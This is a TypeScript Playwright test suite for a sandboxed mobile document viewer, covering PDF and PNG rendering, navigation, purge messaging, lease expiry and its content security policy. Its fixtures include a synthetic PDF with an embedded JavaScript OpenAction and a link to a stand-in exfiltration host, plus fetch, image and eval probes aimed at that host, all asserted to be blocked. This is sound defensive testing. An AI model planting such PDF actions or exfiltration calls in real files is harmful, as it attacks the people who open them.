import test, { before, after } from "node:test";
import assert from "node:assert/strict";
import { createRequire } from "node:module";
import { mkdir } from "node:fs/promises";
import { homedir } from "node:os";
import path from "node:path";
import { randomUUID } from "node:crypto";
import type { Browser, Page } from "playwright";
import { createViewerHtml } from "./html.ts";
import { VIEWER_LIMITS } from "./contracts.ts";
import { encodeBase64 } from "./encoding.ts";
const require = createRequire(
  new URL("../../../web/package.json", import.meta.url),
);
const { chromium } = require("playwright") as typeof import("playwright");
let browser: Browser;
const id = "b".repeat(32);
before(async () => {
  browser = await chromium.launch({ headless: true });
});
after(async () => {
  await browser?.close();
});

function actualPdf() {
  const stream = (text: string) => {
    const data = `BT /F1 24 Tf 25 320 Td (${text}) Tj ET`;
    return `<< /Length ${data.length} >>\nstream\n${data}\nendstream`;
  };
  const objects = [
    "<< /Type /Catalog /Pages 2 0 R /OpenAction 8 0 R >>",
    "<< /Type /Pages /Kids [3 0 R 5 0 R] /Count 2 >>",
    "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 300 400] /Resources << /Font << /F1 7 0 R >> >> /Contents 4 0 R /Annots [9 0 R] >>",
    stream("Native viewer page one"),
    "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 300 400] /Resources << /Font << /F1 7 0 R >> >> /Contents 6 0 R >>",
    stream("Native viewer page two"),
    "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    "<< /Type /Action /S /JavaScript /JS (globalThis.viewerAttack=true) >>",
    "<< /Type /Annot /Subtype /Link /Rect [0 0 200 200] /A << /S /URI /URI (https://viewer-exfil.invalid/) >> >>",
  ];
  let data = "%PDF-1.7\n";
  const offsets = [0];
  for (const [i, object] of objects.entries()) {
    offsets.push(data.length);
    data += `${i + 1} 0 obj\n${object}\nendobj\n`;
  }
  const xref = data.length;
  data += `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n${offsets
    .slice(1)
    .map((offset) => `${String(offset).padStart(10, "0")} 00000 n \n`)
    .join(
      "",
    )}trailer\n<< /Size ${objects.length + 1} /Root 1 0 R >>\nstartxref\n${xref}\n%%EOF\n`;
  return new TextEncoder().encode(data);
}
async function setup(width = 390) {
  const context = await browser.newContext({
    viewport: { width, height: 844 },
    deviceScaleFactor: 1,
  });
  const requests: string[] = [],
    errors: string[] = [];
  await context.route("**/*", (route) => {
    requests.push(route.request().url());
    return route.abort();
  });
  const page = await context.newPage();
  page.on("pageerror", (error) => errors.push(error.message));
  await page.evaluate(() => {
    const host = window as any;
    host.__events = [];
    host.ReactNativeWebView = {
      postMessage: (data: string) => host.__events.push(JSON.parse(data)),
    };
  });
  await page.setContent(createViewerHtml(id));
  await page.waitForFunction(() =>
    (window as any).__events.some((event: any) => event.type === "ready"),
  );
  return { context, page, requests, errors };
}
async function send(page: Page, message: Record<string, unknown>) {
  await page.evaluate(
    (data) => window.dispatchEvent(new MessageEvent("message", { data })),
    JSON.stringify({ ...message, id }),
  );
}
async function transfer(
  page: Page,
  bytes: Uint8Array,
  kind = "pdf",
  mime = "application/pdf",
  ttl = 14_000,
) {
  await send(page, {
    type: "begin",
    kind,
    mime,
    length: bytes.length,
    ttl,
    page: 1,
    zoom: 1,
  });
  for (
    let offset = 0, sequence = 0;
    offset < bytes.length;
    offset += VIEWER_LIMITS.chunkBytes, sequence++
  ) {
    await send(page, {
      type: "chunk",
      sequence,
      data: encodeBase64(
        bytes.subarray(offset, offset + VIEWER_LIMITS.chunkBytes),
      ),
    });
  }
  await send(page, { type: "end" });
}
async function waitPage(page: Page, expected = 1) {
  await page.waitForFunction(
    (expectedPage) =>
      (window as any).__events.some(
        (event: any) => event.type === "page" && event.page === expectedPage,
      ),
    expected,
    { timeout: 10_000 },
  );
}

test("native-viewer renderer: document bridge renders, foreign messages cannot purge, own-window navigation works", async () => {
  const f = await setup();
  try {
    const bytes = actualPdf();
    assert.ok(bytes.length <= VIEWER_LIMITS.chunkBytes);
    const messages = [
      { type: "begin", kind: "pdf", mime: "application/pdf", length: bytes.length, ttl: 14_000, page: 1, zoom: 1 },
      { type: "chunk", sequence: 0, data: encodeBase64(bytes) },
      { type: "end" },
    ].map(message => JSON.stringify({ ...message, id }));
    await f.page.evaluate(values => {
      for (const data of values) document.dispatchEvent(new MessageEvent("message", { data }));
    }, messages);
    await waitPage(f.page);
    const eventsBefore = await f.page.evaluate(() => (window as any).__events.length);
    const diagnostics = await f.page.evaluate(data => {
      const state = () => ({ hidden: document.hidden, textLength: document.getElementById("page-text")!.textContent!.length });
      const observed: unknown[] = [state()];
      const first = new MessageEvent("message", { data, origin: "https://untrusted.invalid", source: null });
      observed.push({ origin: first.origin, self: first.source === window, null: first.source === null });
      window.dispatchEvent(first);
      observed.push(state());
      const frame = document.createElement("iframe");
      document.body.append(frame);
      if (!frame.contentWindow) throw new Error("Foreign-window control unavailable");
      const second = new MessageEvent("message", { data, origin: window.location.origin, source: frame.contentWindow });
      observed.push({ origin: second.origin, self: second.source === window, null: second.source === null });
      window.dispatchEvent(second);
      observed.push(state());
      frame.remove();
      observed.push(state());
      return observed;
    }, JSON.stringify({ id, type: "purge" }));
    assert.equal(await f.page.evaluate(() => (window as any).__events.length), eventsBefore);
    assert.match(await f.page.locator("#page-text").innerText(), /Native viewer page one/, JSON.stringify(diagnostics));
    await f.page.evaluate(data => {
      window.dispatchEvent(new MessageEvent("message", { data, origin: window.location.origin, source: window }));
    }, JSON.stringify({ id, type: "navigate", page: 2, zoom: 1 }));
    await waitPage(f.page, 2);
    assert.match(await f.page.locator("#page-text").innerText(), /Native viewer page two/);
    await f.page.evaluate(data => document.dispatchEvent(new MessageEvent("message", { data })), JSON.stringify({ id, type: "purge" }));
    assert.equal(await f.page.locator("#page-text").textContent(), "");
    assert.deepEqual(f.requests, []);
  } finally {
    await f.context.close();
  }
});
test("native-viewer renderer: actual two-page PDF pixels, text, navigation, zoom and inert PDF actions", async () => {
  const f = await setup();
  try {
    await transfer(f.page, actualPdf());
    await waitPage(f.page);
    assert.match(
      await f.page.locator("#page-text").innerText(),
      /Native viewer page one/,
    );
    const pixels = await f.page
      .locator("canvas")
      .evaluate((canvas: HTMLCanvasElement) => {
        const data = canvas
          .getContext("2d")!
          .getImageData(0, 0, canvas.width, canvas.height).data;
        let ink = 0;
        for (let i = 0; i < data.length; i += 4)
          if (data[i] < 200 && data[i + 1] < 200 && data[i + 2] < 200) ink++;
        return { width: canvas.width, height: canvas.height, ink };
      });
    assert.ok(pixels.width > 300 && pixels.height > 400 && pixels.ink > 100);
    assert.equal(
      await f.page.evaluate(() => (window as any).viewerAttack),
      undefined,
    );
    assert.equal(await f.page.locator("a,iframe,input").count(), 0);
    await send(f.page, { type: "navigate", page: 2, zoom: 1.25 });
    await waitPage(f.page, 2);
    assert.match(
      await f.page.locator("#page-text").innerText(),
      /Native viewer page two/,
    );
    assert.deepEqual(f.requests, []);
    assert.deepEqual(f.errors, []);
    const folder = path.join(
      homedir(),
      ".cache",
      "caseops-mobile",
      "viewer-renderer",
      randomUUID(),
    );
    await mkdir(folder, { recursive: true });
    await f.page.screenshot({
      path: path.join(folder, "synthetic-pdf.png"),
      fullPage: true,
    });
    await send(f.page, { type: "purge" });
    assert.equal(await f.page.locator("#page-text").textContent(), "");
    assert.equal(
      await f.page
        .locator("canvas")
        .evaluate((canvas: HTMLCanvasElement) => canvas.width),
      0,
    );
  } finally {
    await f.context.close();
  }
});
test("native-viewer renderer: actual PNG pixels and lease expiry clear visible content", async () => {
  const f = await setup(768);
  try {
    const base64 = await f.page.evaluate(() => {
      const canvas = document.createElement("canvas");
      canvas.width = 10;
      canvas.height = 12;
      const context = canvas.getContext("2d")!;
      context.fillStyle = "#2d8659";
      context.fillRect(0, 0, 10, 12);
      return canvas.toDataURL("image/png").split(",")[1];
    });
    await transfer(
      f.page,
      new Uint8Array(Buffer.from(base64, "base64")),
      "image",
      "image/png",
      1000,
    );
    await waitPage(f.page);
    const pixel = await f.page
      .locator("canvas")
      .evaluate((canvas: HTMLCanvasElement) => [
        ...canvas.getContext("2d")!.getImageData(10, 10, 1, 1).data,
      ]);
    assert.deepEqual(pixel, [45, 134, 89, 255]);
    await f.page.waitForFunction(() =>
      (window as any).__events.some((event: any) => event.type === "expired"),
    );
    assert.equal(await f.page.locator("#content").isVisible(), false);
    assert.equal(
      await f.page
        .locator("canvas")
        .evaluate((canvas: HTMLCanvasElement) => canvas.width),
      0,
    );
    assert.deepEqual(f.requests, []);
    assert.deepEqual(f.errors, []);
  } finally {
    await f.context.close();
  }
});
test("native-viewer renderer: CSP blocks remote assets and dynamic evaluation without any transport", async () => {
  const f = await setup();
  try {
    const networkBlocked = await f.page.evaluate(async () => {
      let networkBlocked = false;
      try {
        await fetch("https://viewer-exfil.invalid/private");
      } catch {
        networkBlocked = true;
      }
      const image = document.createElement("img");
      image.src = "https://viewer-exfil.invalid/image";
      document.body.append(image);
      return networkBlocked;
    });
    // DevTools evaluate explicitly bypasses unsafe-eval CSP. Execute the probe
    // in a later page-origin task, not in the privileged debugging invocation.
    await f.page.evaluate((nonce) => {
      const script = document.createElement("script");
      script.nonce = nonce;
      script.textContent =
        "setTimeout(() => { try { new Function('globalThis.viewerAttack=true')(); globalThis.__evalBlocked=false; } catch { globalThis.__evalBlocked=true; } }, 0);";
      document.body.append(script);
    }, id);
    await f.page.waitForFunction(
      () => typeof (window as any).__evalBlocked === "boolean",
    );
    assert.equal(networkBlocked, true);
    assert.equal(
      await f.page.evaluate(() => (window as any).__evalBlocked),
      true,
    );
    assert.equal(
      await f.page.evaluate(() => (window as any).viewerAttack),
      undefined,
    );
    await send(f.page, {
      type: "begin",
      kind: "pdf",
      mime: "application/pdf",
      length: 10,
      ttl: 20_000,
    });
    await f.page.waitForFunction(() =>
      (window as any).__events.some((event: any) => event.type === "error"),
    );
    assert.deepEqual(f.requests, []);
    assert.equal(await f.page.locator("#content").isVisible(), false);
  } finally {
    await f.context.close();
  }
});
